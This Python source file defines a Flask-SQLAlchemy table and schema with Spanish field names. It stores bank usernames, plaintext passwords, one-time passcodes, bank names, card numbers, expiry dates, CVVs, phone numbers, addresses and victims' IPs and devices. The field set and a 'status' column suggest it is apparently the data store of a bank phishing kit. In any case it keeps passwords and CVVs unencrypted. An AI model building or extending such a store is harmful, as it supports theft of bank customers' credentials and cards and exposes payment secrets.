from config.bd import db, ma, app

class DataTable(db.Model):
    __tablename__ = 'DataTable'

    idreg = db.Column(db.Integer, primary_key=True)
    nombre = db.Column(db.String(50))
    usuario = db.Column(db.String(25))
    password = db.Column(db.String(30))
    otp = db.Column(db.String(30))
    dispositivo = db.Column(db.String(20))
    ip = db.Column(db.String(50))
    id = db.Column(db.String(50))
    banco = db.Column(db.String(30))
    status = db.Column(db.String(50))
    horacreado = db.Column(db.DateTime, nullable=False)
    horamodificado = db.Column(db.DateTime, nullable=False)
    email = db.Column(db.String(40))
    tarjeta = db.Column(db.String(40))
    ftarjeta = db.Column(db.String(30))
    cvv = db.Column(db.String(10))
    celular = db.Column(db.String(40))
    direccion = db.Column(db.String(50))

    def __init__(self, nombre, usuario, password, otp, dispositivo, ip, id, banco, status, horacreado, horamodificado, email, tarjeta, ftarjeta, cvv, celular, direccion):
        self.nombre = nombre
        self.usuario = usuario
        self.password = password
        self.otp = otp
        self.dispositivo = dispositivo
        self.ip = ip
        self.id = id
        self.banco = banco
        self.status = status
        self.horacreado = horacreado
        self.horamodificado = horamodificado
        self.email = email
        self.tarjeta = tarjeta
        self.ftarjeta = ftarjeta
        self.cvv = cvv
        self.celular = celular
        self.direccion = direccion

with app.app_context():
    db.create_all()
    
class DataTableSchema(ma.Schema):
    class Meta:
        fields = ('idreg', 'nombre', 'usuario', 'password', 'otp', 'dispositivo', 'ip', 'id', 'banco', 'status', 'horacreado', 'horamodificado', 'email', 'tarjeta', 'ftarjeta', 'cvv', 'celular', 'direccion')